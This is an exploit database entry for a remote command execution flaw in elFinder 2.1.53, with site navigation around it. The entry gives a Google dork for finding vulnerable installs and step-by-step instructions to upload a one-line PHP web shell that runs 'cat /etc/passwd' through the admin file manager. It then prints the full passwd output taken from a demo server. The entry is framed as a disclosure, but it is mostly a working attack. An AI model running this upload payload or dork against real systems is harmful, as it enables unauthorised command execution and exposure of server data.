---
title: elFinder Web file manager Version 2.1.53 Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2024030012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-03-07
fetch_date: 2025-10-06T17:08:02.671818
---

# elFinder Web file manager Version 2.1.53 Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **elFinder Web file manager Version 2.1.53 Remote Command Execution** **2024.03.06**  Credit:  **[tmrswrr](https://cxsecurity.com/author/tmrswrr/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-98](https://cxsecurity.com/cwe/CWE-98 "Click to see CWE-98")  [CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")**  **[**Dork:** intitle:"elFinder 2.1.53"](https://cxsecurity.com/dorks/)** | |

# Exploit Title: elFinder Web file manager Version: 2.1.53 Remote Command Execution
# Date: 23/11/2023
# Exploit Author: tmrswrr
# Google Dork: intitle:"elFinder 2.1.53"
# Vendor Homepage: https://studio-42.github.io/elFinder/
# Software Link: https://github.com/Studio-42/elFinder/archive/refs/tags/2.1.53.zip
# Version: 2.1.53
# Tested on: https://www.softaculous.com/apps/cms/CSZ\_CMS
1 ) Enter admin panel and go to this url > https://demos1.softaculous.com/CSZ\_CMSstym1wtmnz/admin/filemanager
2 ) Click Template Main and upload this test.php file :
<?php echo system('cat /etc/passwd'); ?>
3 ) https://demos1.softaculous.com/CSZ\_CMSstym1wtmnz/test.php
root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin systemd-bus-proxy:x:999:998:systemd Bus Proxy:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:998:997:User for polkitd:/:/sbin/nologin tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin chrony:x:997:995::/var/lib/chrony:/sbin/nologin soft:x:1000:1000::/home/soft:/sbin/nologin saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin emps:x:995:1001::/home/emps:/bin/bash named:x:25:25:Named:/var/named:/sbin/nologin exim:x:93:93::/var/spool/exim:/sbin/nologin vmail:x:5000:5000::/var/local/vmail:/bin/bash webuzo:x:992:991::/home/webuzo:/bin/bash apache:x:991:990::/home/apache:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024030012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 -1

0%

100%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top